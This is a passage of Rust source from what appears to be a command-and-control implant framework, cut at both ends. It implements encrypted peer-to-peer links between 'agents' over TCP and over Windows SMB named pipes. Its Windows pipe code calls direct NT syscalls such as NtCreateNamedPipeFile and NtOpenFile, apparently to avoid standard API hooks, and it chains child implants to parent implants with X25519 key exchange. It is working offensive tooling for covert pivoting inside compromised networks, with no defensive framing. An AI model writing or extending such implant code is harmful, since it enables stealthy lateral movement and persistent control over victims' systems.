            let frame_type = P2pFrameType::from_u8(header[0]).ok_or_else(|| {
                anyhow!("unknown P2P frame type: 0x{:02X}", header[0])
            })?;
            let link_id = u32::from_le_bytes([header[2], header[3], header[4], header[5]]);
            let payload_len = u32::from_le_bytes([header[6], header[7], header[8], header[9]]);

            if payload_len > MAX_PAYLOAD_BYTES {
                return Err(anyhow!(
                    "p2p-tcp: payload too large: {payload_len} > {MAX_PAYLOAD_BYTES}"
                ));
            }
            if frame_buf.len() < HEADER_SIZE + payload_len as usize {
                return Err(anyhow!(
                    "p2p-tcp: frame truncated: have {} bytes, need {}",
                    frame_buf.len(),
                    HEADER_SIZE + payload_len as usize
                ));
            }

            let payload = frame_buf[HEADER_SIZE..HEADER_SIZE + payload_len as usize].to_vec();

            Ok(P2pFrame {
                frame_type,
                link_id,
                payload_len,
                payload,
            })
        }

        /// Write a complete `P2pFrame` to the TCP stream.
        ///
        /// Wire format: `[frame_len: u32 LE][P2pFrame bytes]`
        pub async fn write_frame(&mut self, frame: &P2pFrame) -> Result<()> {
            let frame_bytes = frame.to_bytes();
            let len_prefix = (frame_bytes.len() as u32).to_le_bytes();

            // Write length prefix + frame bytes in one syscall when possible.
            let mut out = Vec::with_capacity(4 + frame_bytes.len());
            out.extend_from_slice(&len_prefix);
            out.extend_from_slice(&frame_bytes);
            self.stream.write_all(&out).await?;
            self.stream.flush().await?;
            Ok(())
        }

        /// Read a P2pFrame and decrypt its payload using the given key.
        pub async fn read_frame_decrypt(
            &mut self,
            key: &[u8; 32],
        ) -> Result<P2pFrame> {
            let mut frame = self.read_frame().await?;
            if !frame.payload.is_empty() {
                frame.payload = decrypt_payload(key, &frame.payload)?;
            }
            Ok(frame)
        }

        /// Encrypt the payload of a P2pFrame and write it to the stream.
        pub async fn encrypt_write_frame(
            &mut self,
            frame: &P2pFrame,
            key: &[u8; 32],
        ) -> Result<()> {
            let encrypted = if frame.payload.is_empty() {
                frame.payload.clone()
            } else {
                encrypt_payload(key, &frame.payload)?
            };
            let enc_frame = P2pFrame {
                frame_type: frame.frame_type,
                link_id: frame.link_id,
                payload_len: encrypted.len() as u32,
                payload: encrypted,
            };
            self.write_frame(&enc_frame).await
        }

        /// Shut down the stream gracefully.
        pub async fn shutdown(&mut self) -> Result<()> {
            self.stream.shutdown().await?;
            Ok(())
        }
    }

    // ── TCP listener (parent side) ───────────────────────────────────────

    /// Parent-side TCP listener that accepts incoming P2P link requests
    /// from child agents over the network.
    ///
    /// Binds to `127.0.0.1:<port>` where `<port>` is either configured
    /// (`p2p_tcp_port`) or 0 (OS-assigned random port).
    pub struct P2pTcpListener {
        /// The bound TCP listener.
        listener: tokio::net::TcpListener,
        /// The actual address the listener is bound to (useful when port=0).
        bind_addr: std::net::SocketAddr,
        /// Maximum number of child links (capacity check).
        max_children: usize,
        /// This agent's ID.
        agent_id: String,
    }

    impl std::fmt::Debug for P2pTcpListener {
        fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
            f.debug_struct("P2pTcpListener")
                .field("bind_addr", &self.bind_addr)
                .field("max_children", &self.max_children)
                .finish()
        }
    }

    impl P2pTcpListener {
        /// Create a TCP P2P listener bound to `127.0.0.1:<port>`.
        ///
        /// If `port` is 0, the OS assigns a random available port.
        /// Use [`bind_addr()`](Self::bind_addr) to discover the actual port.
        pub async fn create(
            agent_id: String,
            max_children: usize,
            port: u16,
        ) -> Result<Self> {
            let bind_addr: std::net::SocketAddr = format!("127.0.0.1:{port}")
                .parse()
                .map_err(|e| anyhow!("invalid bind address: {e}"))?;

            let listener = tokio::net::TcpListener::bind(bind_addr).await?;

            let actual_addr = listener.local_addr()?;

            info!(
                "p2p-tcp: listening on {} (max_children={max_children})",
                actual_addr
            );

            Ok(Self {
                listener,
                bind_addr: actual_addr,
                max_children,
                agent_id,
            })
        }

        /// Return the actual bound address (useful when port was 0).
        pub fn bind_addr(&self) -> std::net::SocketAddr {
            self.bind_addr
        }

        /// Accept one incoming TCP connection, perform the link handshake,
        /// and return a `P2pListenerEvent`.
        ///
        /// This is an **async** call that awaits the next connection.
        pub async fn accept_one(&self) -> P2pListenerEvent {
            // 1. Accept the TCP connection.
            let (stream, peer_addr) = match self.listener.accept().await {
                Ok(s) => s,
                Err(e) => {
                    return P2pListenerEvent::ListenerError(format!(
                        "TCP accept failed: {e}"
                    ));
                }
            };

            info!("p2p-tcp: accepted connection from {peer_addr}");

            let mut handle = TcpP2pHandle::new(stream);

            // 2. Read the LinkRequest frame.
            let frame = match handle.read_frame().await {
                Ok(f) => f,
                Err(e) => {
                    return P2pListenerEvent::LinkRejected {
                        reason: 0xFF,
                        description: format!("failed to read LinkRequest: {e}"),
                    };
                }
            };

            if frame.frame_type != P2pFrameType::LinkRequest {
                return P2pListenerEvent::LinkRejected {
                    reason: 0xFF,
                    description: format!(
                        "expected LinkRequest, got {:?}",
                        frame.frame_type
                    ),
                };
            }

            // 3. Parse the LinkRequest payload.
            let (child_agent_id, child_pubkey) = match parse_link_request(&frame.payload) {
                Ok(v) => v,
                Err(e) => {
                    return P2pListenerEvent::LinkRejected {
                        reason: 0xFF,
                        description: format!("invalid LinkRequest payload: {e}"),
                    };
                }
            };

            info!(
                "p2p-tcp: received LinkRequest from agent '{}', link_id={:#010X}",
                child_agent_id, frame.link_id
            );

            // 4. X25519 ECDH key exchange.
            let our_secret = EphemeralSecret::random_from_rng(rand::thread_rng());
            let our_public = PublicKey::from(&our_secret);
            let peer_public = PublicKey::from(child_pubkey);
            let shared = our_secret.diffie_hellman(&peer_public);

            // 5. Derive per-link ChaCha20-Poly1305 key via HKDF-SHA256.
            let link_key = derive_link_key(shared.as_bytes());

            // 6. Send LinkAccept with our public key.
            let accept_payload = build_link_accept_payload(our_public.as_bytes());
            let accept_frame = P2pFrame {
                frame_type: P2pFrameType::LinkAccept,
                link_id: frame.link_id,
                payload_len: accept_payload.len() as u32,
                payload: accept_payload,
            };

            if let Err(e) = handle.write_frame(&accept_frame).await {
                return P2pListenerEvent::LinkRejected {
                    reason: 0xFF,
                    description: format!("failed to send LinkAccept: {e}"),
                };
            }

            info!(
                "p2p-tcp: LinkAccept sent to agent '{}', link_id={:#010X}",
                child_agent_id, frame.link_id
            );

            // 7. Build and return the P2pLink.
            let handle_arc = std::sync::Arc::new(tokio::sync::Mutex::new(handle));

            let mut link = P2pLink::new(
                frame.link_id,
                LinkRole::Child,
                P2pTransport::TcpStream(handle_arc),
                child_agent_id,
                link_key,
            );

            if let Err(e) = link.transition(LinkState::Connected) {
                return P2pListenerEvent::LinkRejected {
                    reason: 0xFF,
                    description: format!("link state transition failed: {e}"),
                };
            }

            P2pListenerEvent::LinkEstablished(link)
        }

        /// Accept a connection with capacity checking against the mesh.
        ///
        /// If the mesh is at capacity, sends `LinkReject` with reason
        /// `REJECT_CAPACITY_FULL` and closes the TCP stream.
        pub async fn accept_with_capacity(
            &self,
            current_child_count: usize,
        ) -> P2pListenerEvent {
            if current_child_count >= self.max_children {
                // Accept the connection first, then reject it.
                let event = self.accept_one().await;

                if let P2pListenerEvent::LinkEstablished(link) = event {
                    // Send LinkReject on the TCP stream before dropping.
                    if let P2pTransport::TcpStream(ref handle_arc) = link.transport {
                        let reject_payload = build_link_reject_payload(REJECT_CAPACITY_FULL);
                        let reject_frame = P2pFrame {
                            frame_type: P2pFrameType::LinkReject,
                            link_id: link.link_id,
                            payload_len: reject_payload.len() as u32,
                            payload: reject_payload,
                        };
                        let mut h = handle_arc.lock().await;
                        let _ = h.write_frame(&reject_frame).await;
                    }
                    warn!(
                        "p2p-tcp: rejected link from '{}' — capacity full ({}/{})",
                        link.peer_agent_id,
                        current_child_count,
                        self.max_children
                    );
                    return P2pListenerEvent::LinkRejected {
                        reason: REJECT_CAPACITY_FULL,
                        description: format!(
                            "capacity full: {}/{max_children} children",
                            current_child_count,
                            max_children = self.max_children
                        ),
                    };
                }
                return event;
            }

            self.accept_one().await
        }

        /// Spawn the listener as a background task that delivers events
        /// via a `tokio::sync::mpsc` channel.
        ///
        /// Each accepted connection produces one `P2pListenerEvent` on
        /// the channel.
        pub fn spawn(
            self,
            tx: tokio::sync::mpsc::Sender<P2pListenerEvent>,
        ) -> tokio::task::JoinHandle<()> {
            tokio::spawn(async move {
                loop {
                    let event = self.accept_one().await;

                    if tx.send(event).await.is_err() {
                        info!("p2p-tcp: receiver dropped, shutting down listener");
                        break;
                    }
                }
            })
        }

        /// Spawn the listener with capacity checking.
        pub fn spawn_with_capacity(
            self,
            tx: tokio::sync::mpsc::Sender<P2pListenerEvent>,
            mut child_count: usize,
        ) -> tokio::task::JoinHandle<()> {
            tokio::spawn(async move {
                loop {
                    let event = self.accept_with_capacity(child_count).await;

                    match &event {
                        P2pListenerEvent::LinkEstablished(_) => {
                            child_count += 1;
                        }
                        P2pListenerEvent::ListenerError(_) => {
                            let _ = tx.send(event).await;
                            break;
                        }
                        _ => {}
                    }

                    if tx.send(event).await.is_err() {
                        info!("p2p-tcp: receiver dropped, shutting down listener");
                        break;
                    }
                }
            })
        }
    }

    // ── TCP connector (child side) ───────────────────────────────────────

    /// Result of a TCP P2P connection attempt from the child side.
    #[derive(Debug)]
    pub enum ConnectResult {
        /// The link was established successfully.
        Connected(P2pLink),
        /// The parent rejected the link.
        Rejected {
            /// Reason code from the `LinkReject` frame.
            reason: u8,
            /// Human-readable description.
            description: String,
        },
    }

    /// Connect to a parent agent's TCP P2P listener and perform the
    /// link handshake.
    ///
    /// 1. Connect via TCP to `host:port`.
    /// 2. Send `LinkRequest` with our `agent_id` and X25519 public key.
    /// 3. Read the response: `LinkAccept` → complete ECDH → `Connected`;
    ///    `LinkReject` → report failure.
    pub async fn connect(
        host: &str,
        port: u16,
        agent_id: &str,
        link_id: u32,
    ) -> Result<ConnectResult> {
        let addr = format!("{host}:{port}");

        info!("p2p-tcp: connecting to parent at {addr}");

        let stream = TcpStream::connect(&addr).await?;
        let mut handle = TcpP2pHandle::new(stream);

        info!("p2p-tcp: TCP connected to {addr}");

        // 1. Generate our X25519 ephemeral keypair.
        let our_secret = EphemeralSecret::random_from_rng(rand::thread_rng());
        let our_public = PublicKey::from(&our_secret);

        // 2. Build and send LinkRequest.
        let req_payload = build_link_request_payload(agent_id, our_public.as_bytes());
        let req_frame = P2pFrame {
            frame_type: P2pFrameType::LinkRequest,
            link_id,
            payload_len: req_payload.len() as u32,
            payload: req_payload,
        };

        handle.write_frame(&req_frame).await?;

        info!("p2p-tcp: LinkRequest sent, link_id={:#010X}", link_id);

        // 3. Read response frame.
        let resp_frame = handle.read_frame().await?;

        match resp_frame.frame_type {
            P2pFrameType::LinkAccept => {
                // 4. Parse parent's X25519 public key.
                if resp_frame.payload.len() < 32 {
                    return Err(anyhow!(
                        "LinkAccept payload too short: {} < 32",
                        resp_frame.payload.len()
                    ));
                }
                let mut parent_pubkey = [0u8; 32];
                parent_pubkey.copy_from_slice(&resp_frame.payload[..32]);

                // 5. Complete ECDH.
                let peer_public = PublicKey::from(parent_pubkey);
                let shared = our_secret.diffie_hellman(&peer_public);

                // 6. Derive per-link key.
                let link_key = derive_link_key(shared.as_bytes());

                info!(
                    "p2p-tcp: link established with parent at {addr}, link_id={:#010X}",
                    link_id
                );

                // 7. Build the P2pLink.
                let handle_arc = std::sync::Arc::new(tokio::sync::Mutex::new(handle));

                let mut link = P2pLink::new(
                    link_id,
                    LinkRole::Parent,
                    P2pTransport::TcpStream(handle_arc),
                    addr, // peer_agent_id is the address for now
                    link_key,
                );

                link.transition(LinkState::Connected)
                    .map_err(|e| anyhow!("link state transition failed: {e}"))?;

                Ok(ConnectResult::Connected(link))
            }

            P2pFrameType::LinkReject => {
                let reason = resp_frame.payload.first().copied().unwrap_or(0xFF);
                let description = if reason == REJECT_CAPACITY_FULL {
                    "parent at capacity".to_string()
                } else {
                    format!("rejected with reason code {reason:#04X}")
                };

                warn!(
                    "p2p-tcp: link rejected by parent at {addr}: {description}"
                );

                Ok(ConnectResult::Rejected {
                    reason,
                    description,
                })
            }

            other => Err(anyhow!(
                "unexpected response frame type: {:?}",
                other
            )),
        }
    }
}

// ══════════════════════════════════════════════════════════════════════════
// TCP P2P stub (when p2p-tcp feature is not enabled)
// ══════════════════════════════════════════════════════════════════════════

#[cfg(not(feature = "p2p-tcp"))]
pub mod tcp_transport {
    //! Stub module — TCP P2P relay is only available with the `p2p-tcp` feature.

    /// Stub TCP handle.
    pub struct TcpP2pHandle {
        _private: (),
    }

    /// Stub listener — always returns an error on `create`.
    pub struct P2pTcpListener {
        _private: (),
    }

    impl P2pTcpListener {
        pub async fn create(
            _agent_id: String,
            _max_children: usize,
            _port: u16,
        ) -> anyhow::Result<Self> {
            Err(anyhow::anyhow!(
                "p2p-tcp: TCP P2P relay requires the `p2p-tcp` feature"
            ))
        }

        pub fn bind_addr(&self) -> std::net::SocketAddr {
            "127.0.0.1:0".parse().unwrap()
        }
    }

    /// Connect result stub.
    #[derive(Debug)]
    pub enum ConnectResult {
        Connected(super::P2pLink),
        Rejected { reason: u8, description: String },
    }

    pub async fn connect(
        _host: &str,
        _port: u16,
        _agent_id: &str,
        _link_id: u32,
    ) -> anyhow::Result<ConnectResult> {
        Err(anyhow::anyhow!(
            "p2p-tcp: TCP P2P relay requires the `p2p-tcp` feature"
        ))
    }
}

// ══════════════════════════════════════════════════════════════════════════
// Windows SMB Named-Pipe Server (parent agent listener)
// ══════════════════════════════════════════════════════════════════════════

#[cfg(all(windows, feature = "smb-pipe-transport"))]
pub mod nt_pipe_server {
    use super::*;
    use anyhow::{anyhow, Result};
    use log::{info, warn};
    use std::sync::Mutex;
    use x25519_dalek::{EphemeralSecret, PublicKey};

    // ── NT constants ─────────────────────────────────────────────────────

    const STATUS_PENDING: i32 = 0x00000103;
    const OBJ_CASE_INSENSITIVE: u32 = 0x00000040;
    const SYNCHRONIZE: u32 = 0x00100000;
    const GENERIC_READ: u32 = 0x80000000;
    const GENERIC_WRITE: u32 = 0x40000000;

    // Named-pipe specific constants
    const FILE_PIPE_MESSAGE_MODE: u32 = 1; // message-type mode (read)
    const FILE_PIPE_QUEUE_OPERATION: u32 = 0; // blocking (completion mode)

    // FSCTL_PIPE_LISTEN = CTL_CODE(FILE_DEVICE_NAMED_PIPE, 4, METHOD_BUFFERED, FILE_ANY_ACCESS)
    // FILE_DEVICE_NAMED_PIPE = 0x11
    // CTL_CODE = (DeviceType << 16) | (Function << 2) | Method
    // = (0x11 << 16) | (4 << 2) | 0 = 0x00110010
    const FSCTL_PIPE_LISTEN: u32 = 0x00110010;

    // Re-export shared constants from parent scope.
    pub use super::{REJECT_CAPACITY_FULL, MAX_AGENT_ID_LEN};

    // ── NT pipe handle wrapper ───────────────────────────────────────────

    /// Thread-safe wrapper around an NT pipe handle using direct syscalls.
    ///
    /// Mirrors the `NtPipeHandle` in `c2_smb.rs` but lives here so the
    /// P2P module is self-contained.
    pub struct NtPipeHandle {
        handle: Mutex<*mut std::ffi::c_void>,
    }

    // SAFETY: The handle is protected by a Mutex; NT handles are thread-safe.
    unsafe impl Send for NtPipeHandle {}
    unsafe impl Sync for NtPipeHandle {}

    impl std::fmt::Debug for NtPipeHandle {
        fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
            let h = self.handle.lock().unwrap();
            f.debug_struct("NtPipeHandle")
                .field("handle", &format_args!("{:p}", *h))
                .finish()
        }
    }

    impl NtPipeHandle {
        /// Create a new handle wrapper.
        pub fn new(handle: *mut std::ffi::c_void) -> Self {
            Self {
                handle: Mutex::new(handle),
            }
        }

        /// Read exactly `buf.len()` bytes.
        pub fn read_exact(&self, buf: &mut [u8]) -> Result<()> {
            let handle = *self.handle.lock().unwrap();
            let mut filled = 0;
            while filled < buf.len() {
                let n = unsafe { read_file(handle, &mut buf[filled..])? };
                if n == 0 {
                    return Err(anyhow!("p2p-pipe: EOF while reading from pipe"));
                }
                filled += n;
            }
            Ok(())
        }

        /// Write all bytes.
        pub fn write_all(&self, buf: &[u8]) -> Result<()> {
            let handle = *self.handle.lock().unwrap();
            let mut written = 0;
            while written < buf.len() {
                let n = unsafe { write_file(handle, &buf[written..])? };
                if n == 0 {
                    return Err(anyhow!("p2p-pipe: write returned 0 bytes"));
                }
                written += n;
            }
            Ok(())
        }

        /// Read a complete `P2pFrame` from the pipe.
        pub fn read_frame(&self) -> Result<P2pFrame> {
            // Read the 10-byte header first.
            let mut header = [0u8; HEADER_SIZE];
            self.read_exact(&mut header)?;

            let frame_type = P2pFrameType::from_u8(header[0]).ok_or_else(|| {
                anyhow!("unknown P2P frame type: 0x{:02X}", header[0])
            })?;
            let link_id = u32::from_le_bytes([header[2], header[3], header[4], header[5]]);
            let payload_len = u32::from_le_bytes([header[6], header[7], header[8], header[9]]);

            if payload_len > MAX_PAYLOAD_BYTES {
                return Err(anyhow!(
                    "p2p-pipe: payload too large: {payload_len} > {MAX_PAYLOAD_BYTES}"
                ));
            }

            let mut payload = vec![0u8; payload_len as usize];
            if payload_len > 0 {
                self.read_exact(&mut payload)?;
            }

            Ok(P2pFrame {
                frame_type,
                link_id,
                payload_len,
                payload,
            })
        }

        /// Write a complete `P2pFrame` to the pipe.
        pub fn write_frame(&self, frame: &P2pFrame) -> Result<()> {
            let bytes = frame.to_bytes();
            self.write_all(&bytes)
        }
    }

    impl Drop for NtPipeHandle {
        fn drop(&mut self) {
            let handle = *self.handle.lock().unwrap();
            if !handle.is_null() {
                let _ = unsafe { close_handle(handle) };
            }
        }
    }

    // ── NT syscall wrappers ──────────────────────────────────────────────

    /// Build a Windows NT UNICODE_STRING on the stack.
    unsafe fn init_unicode_string(
        dest: &mut winapi::shared::ntdef::UNICODE_STRING,
        s: &[u16],
    ) {
        dest.Buffer = s.as_ptr() as *mut _;
        dest.Length = (s.len() * 2) as u16;
        dest.MaximumLength = dest.Length;
    }

    /// Create a named pipe via `NtCreateNamedPipeFile` (NT direct syscall).
    ///
    /// Creates a message-type pipe with `max_instances` slots.
    unsafe fn create_named_pipe(
        pipe_path: &str,
        max_instances: u32,
    ) -> Result<*mut std::ffi::c_void> {
        // Convert Win32 path (\\.\pipe\...) to NT path (\??\pipe\...).
        let nt_path_str = if pipe_path.starts_with(r"\\") {
            format!(r"\??\{}", &pipe_path[2..])
        } else {
            format!(r"\??\{}", pipe_path)
        };
        let nt_wide: Vec<u16> = nt_path_str.encode_utf16().chain(std::iter::once(0)).collect();

        let mut name_str: winapi::shared::ntdef::UNICODE_STRING = std::mem::zeroed();
        init_unicode_string(&mut name_str, &nt_wide);

        let mut obj_attrs: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
        obj_attrs.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
        obj_attrs.ObjectName = &mut name_str;
        obj_attrs.Attributes = OBJ_CASE_INSENSITIVE;

        let mut iosb: winapi::shared::ntdef::IO_STATUS_BLOCK = std::mem::zeroed();
        let mut handle: *mut std::ffi::c_void = std::ptr::null_mut();
        let mut timeout: winapi::shared::ntdef::LARGE_INTEGER = std::mem::zeroed();

        // NtCreateNamedPipeFile signature (11 args):
        //   PipeHandle, DesiredAccess, ObjectAttributes, IoStatusBlock,
        //   ReadMode, CompletionMode, MaximumInstances,
        //   InboundQuota, OutboundQuota, DefaultTimeout, Timeout
        let status = nt_syscall::syscall!(
            "NtCreateNamedPipeFile",
            &mut handle as *mut _ as u64,
            (GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE) as u64,
            &mut obj_attrs as *mut _ as u64,
            &mut iosb as *mut _ as u64,
            FILE_PIPE_MESSAGE_MODE as u64,               // ReadMode
            FILE_PIPE_QUEUE_OPERATION as u64,             // CompletionMode (blocking)
            max_instances as u64,                          // MaximumInstances
            65536u64,                                       // InboundQuota
            65536u64,                                       // OutboundQuota
            &mut timeout as *mut _ as u64,                // DefaultTimeout
        )
        .map_err(|e| anyhow!("nt_syscall resolution for NtCreateNamedPipeFile: {e}"))?;

        if status < 0 {
            return Err(anyhow!(
                "NtCreateNamedPipeFile failed for '{pipe_path}': NTSTATUS {:#010X}",
                status as u32
            ));
        }
        Ok(handle)
    }

    /// Wait for a client to connect to a named pipe using
    /// `NtFsControlFile` with `FSCTL_PIPE_LISTEN`.
    unsafe fn pipe_listen(handle: *mut std::ffi::c_void) -> Result<()> {
        let mut iosb: winapi::shared::ntdef::IO_STATUS_BLOCK = std::mem::zeroed();
        let status = nt_syscall::syscall!(
            "NtFsControlFile",
            handle as u64,                              // FileHandle
            0u64,                                        // Event
            0u64,                                        // ApcRoutine
            0u64,                                        // ApcContext
            &mut iosb as *mut _ as u64,                 // IoStatusBlock
            FSCTL_PIPE_LISTEN as u64,                   // FsControlCode
            0u64,                                        // InputBuffer
            0u64,                                        // InputBufferLength
            0u64,                                        // OutputBuffer
            0u64,                                        // OutputBufferLength
        )
        .map_err(|e| anyhow!("nt_syscall resolution for NtFsControlFile: {e}"))?;

        if status < 0 && status != STATUS_PENDING {
            return Err(anyhow!(
                "NtFsControlFile(FSCTL_PIPE_LISTEN) failed: NTSTATUS {:#010X}",
                status as u32
            ));
        }
        Ok(())
    }

    /// Read bytes from a file handle via `NtReadFile` (NT direct syscall).
    unsafe fn read_file(handle: *mut std::ffi::c_void, buf: &mut [u8]) -> Result<usize> {
        let mut iosb: winapi::shared::ntdef::IO_STATUS_BLOCK = std::mem::zeroed();
        let status = nt_syscall::syscall!(
            "NtReadFile",
            handle as u64,
            0u64,
            0u64,
            0u64,
            &mut iosb as *mut _ as u64,
            buf.as_mut_ptr() as u64,
            buf.len() as u64,
            std::ptr::null::<i64>() as u64,
            0u64,
        )
        .map_err(|e| anyhow!("nt_syscall resolution for NtReadFile: {e}"))?;

        if status < 0 && status != STATUS_PENDING {
            return Err(anyhow!(
                "NtReadFile failed: NTSTATUS {:#010X}",
                status as u32
            ));
        }
        Ok(iosb.Information as usize)
    }

    /// Write bytes to a file handle via `NtWriteFile` (NT direct syscall).
    unsafe fn write_file(handle: *mut std::ffi::c_void, buf: &[u8]) -> Result<usize> {
        let mut iosb: winapi::shared::ntdef::IO_STATUS_BLOCK = std::mem::zeroed();
        let status = nt_syscall::syscall!(
            "NtWriteFile",
            handle as u64,
            0u64,
            0u64,
            0u64,
            &mut iosb as *mut _ as u64,
            buf.as_ptr() as u64,
            buf.len() as u64,
            std::ptr::null::<i64>() as u64,
            0u64,
        )
        .map_err(|e| anyhow!("nt_syscall resolution for NtWriteFile: {e}"))?;

        if status < 0 && status != STATUS_PENDING {
            return Err(anyhow!(
                "NtWriteFile failed: NTSTATUS {:#010X}",
                status as u32
            ));
        }
        Ok(iosb.Information as usize)
    }

    /// Close a handle via `NtClose` (NT direct syscall).
    unsafe fn close_handle(handle: *mut std::ffi::c_void) -> Result<()> {
        let status = nt_syscall::syscall!("NtClose", handle as u64)
            .map_err(|e| anyhow!("nt_syscall resolution for NtClose: {e}"))?;
        if status < 0 {
            return Err(anyhow!("NtClose failed: NTSTATUS {:#010X}", status as u32));
        }
        Ok(())
    }

    // ── NT client-side constants ──────────────────────────────────────

    /// NTSTATUS: The object name was not found (pipe does not exist).
    const STATUS_OBJECT_NAME_NOT_FOUND: i32 = 0xC0000034_i32;
    /// NTSTATUS: All pipe instances are busy.
    const STATUS_INSTANCE_NOT_AVAILABLE: i32 = 0xC00000AB_i32;
    /// NTSTATUS: Named pipe is busy (no instances available for connection).
    const STATUS_PIPE_BUSY: i32 = 0xC00000AE_i32;

    const FILE_SHARE_READ: u32 = 0x00000001;
    const FILE_SHARE_WRITE: u32 = 0x00000002;
    const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x00000020;

    /// Maximum number of connection retries on pipe-busy errors.
    const MAX_CONNECT_RETRIES: u32 = 5;
    /// Delay between connection retries (milliseconds).
    const CONNECT_RETRY_DELAY_MS: u64 = 1000;

    // ── Client-side pipe opener ───────────────────────────────────────

    /// Open a named pipe via `NtOpenFile` (client-side connect).
    ///
    /// Returns the raw NTSTATUS on failure so the caller can decide
    /// whether to retry.  On success, returns the pipe handle.
    unsafe fn open_pipe_raw(
        pipe_path: &str,
    ) -> std::result::Result<*mut std::ffi::c_void, i32> {
        // Convert to NT path:
        //   Win32  \\.\pipe\name  →  \??\pipe\name
        //   NT     \??\pipe\name  →  unchanged
        //   bare   name           →  \??\pipe\name
        let nt_path_str = if pipe_path.starts_with(r"\\") {
            format!(r"\??\{}", &pipe_path[2..])
        } else if pipe_path.starts_with(r"\??\") {
            pipe_path.to_string()
        } else {
            format!(r"\??\pipe\{}", pipe_path)
        };
        let nt_wide: Vec<u16> = nt_path_str.encode_utf16().chain(std::iter::once(0)).collect();

        let mut name_str: winapi::shared::ntdef::UNICODE_STRING = std::mem::zeroed();
        init_unicode_string(&mut name_str, &nt_wide);

        let mut obj_attrs: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
        obj_attrs.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
        obj_attrs.ObjectName = &mut name_str;
        obj_attrs.Attributes = OBJ_CASE_INSENSITIVE;

        let mut iosb: winapi::shared::ntdef::IO_STATUS_BLOCK = std::mem::zeroed();
        let mut handle: *mut std::ffi::c_void = std::ptr::null_mut();

        let status = nt_syscall::syscall!(
            "NtOpenFile",
            &mut handle as *mut _ as u64,                 // FileHandle
            (GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE) as u64, // DesiredAccess
            &mut obj_attrs as *mut _ as u64,              // ObjectAttributes
            &mut iosb as *mut _ as u64,                   // IoStatusBlock
            (FILE_SHARE_READ | FILE_SHARE_WRITE) as u64,  // ShareAccess
            FILE_SYNCHRONOUS_IO_NONALERT as u64,          // OpenOptions
        )
        .map_err(|e| anyhow!("nt_syscall resolution for NtOpenFile: {e}"))?;

        if status < 0 {
            return Err(status);
        }
        Ok(handle)
    }

    /// Open a named pipe with retry on transient busy errors.
    ///
    /// Retries up to [`MAX_CONNECT_RETRIES`] times with a
    /// [`CONNECT_RETRY_DELAY_MS`] delay between attempts when the pipe
    /// returns `STATUS_PIPE_BUSY` or `STATUS_INSTANCE_NOT_AVAILABLE`.
    ///
    /// `STATUS_OBJECT_NAME_NOT_FOUND` is returned immediately as
    /// "parent not listening".
    fn open_pipe_with_retry(pipe_path: &str) -> Result<*mut std::ffi::c_void> {
        for attempt in 0..MAX_CONNECT_RETRIES {
            match unsafe { open_pipe_raw(pipe_path) } {
                Ok(h) => return Ok(h),
                Err(status) if status == STATUS_PIPE_BUSY || status == STATUS_INSTANCE_NOT_AVAILABLE => {
                    if attempt + 1 < MAX_CONNECT_RETRIES {
                        info!(
                            "p2p-pipe: pipe busy (NTSTATUS {:#010X}), retrying ({}/{}) in {}ms",
                            status as u32,
                            attempt + 1,
                            MAX_CONNECT_RETRIES,
                            CONNECT_RETRY_DELAY_MS,
                        );
                        std::thread::sleep(std::time::Duration::from_millis(CONNECT_RETRY_DELAY_MS));
                        continue;
                    }
                    return Err(anyhow!(
                        "NtOpenFile: pipe busy after {} retries for '{pipe_path}' \
                         (last NTSTATUS {:#010X})",
                        MAX_CONNECT_RETRIES,
                        status as u32,
                    ));
                }
                Err(STATUS_OBJECT_NAME_NOT_FOUND) => {
                    return Err(anyhow!(
                        "SMB P2P parent not listening: pipe '{pipe_path}' does not exist \
                         (STATUS_OBJECT_NAME_NOT_FOUND)"
                    ));
                }
                Err(status) => {
                    return Err(anyhow!(
                        "NtOpenFile failed for '{pipe_path}': NTSTATUS {:#010X}",
                        status as u32
                    ));
                }
            }
        }
        unreachable!()
    }

    // ── Client connector (child → parent) ────────────────────────────

    /// Result of an SMB pipe P2P connection attempt from the child side.
    #[derive(Debug)]
    pub enum ConnectResult {
        /// The link was established successfully.
        Connected(P2pLink),
        /// The parent rejected the link.
        Rejected {
            /// Reason code from the `LinkReject` frame.
            reason: u8,
            /// Human-readable description.
            description: String,
        },
    }

    /// Connect to a parent agent's SMB named pipe and perform the
    /// link handshake.
    ///
    /// 1. Open the named pipe via `NtOpenFile` (retry on pipe busy).
    /// 2. Send `LinkRequest` with our `agent_id` and X25519 public key.
    /// 3. Read the response: `LinkAccept` → complete ECDH → `Connected`;
    ///    `LinkReject` → report failure.
    ///
    /// The `pipe_addr` parameter can be:
    /// - A Win32 pipe path: `\\.\pipe\<name>`
    /// - An NT path: `\??\pipe\<name>`
    /// - A bare pipe name: `<name>` (will be prefixed with `\??\pipe\`)
    ///
    /// This is a **blocking** function (NT pipe I/O is synchronous).
    pub fn connect(
        pipe_addr: &str,
        agent_id: &str,
        link_id: u32,
    ) -> Result<ConnectResult> {
        info!("p2p-pipe: connecting to parent at '{pipe_addr}'");

        // Open the pipe with retry logic.
        let handle = open_pipe_with_retry(pipe_addr)?;

        // Wrap in NtPipeHandle for frame I/O.
        let pipe = std::sync::Arc::new(NtPipeHandle::new(handle));

        info!("p2p-pipe: pipe opened successfully");

        // 1. Generate our X25519 ephemeral keypair.
        let our_secret = EphemeralSecret::random_from_rng(rand::thread_rng());
        let our_public = PublicKey::from(&our_secret);

        // 2. Build and send LinkRequest.
        let req_payload = build_link_request_payload(agent_id, our_public.as_bytes());
        let req_frame = P2pFrame {
            frame_type: P2pFrameType::LinkRequest,
            link_id,
            payload_len: req_payload.len() as u32,
            payload: req_payload,
        };
        pipe.write_frame(&req_frame)?;

        info!("p2p-pipe: LinkRequest sent, link_id={:#010X}", link_id);

        // 3. Read response frame.
        let resp_frame = pipe.read_frame()?;

        match resp_frame.frame_type {
            P2pFrameType::LinkAccept => {
                // 4. Parse parent's X25519 public key.
                if resp_frame.payload.len() < 32 {
                    return Err(anyhow!(
                        "LinkAccept payload too short: {} < 32",
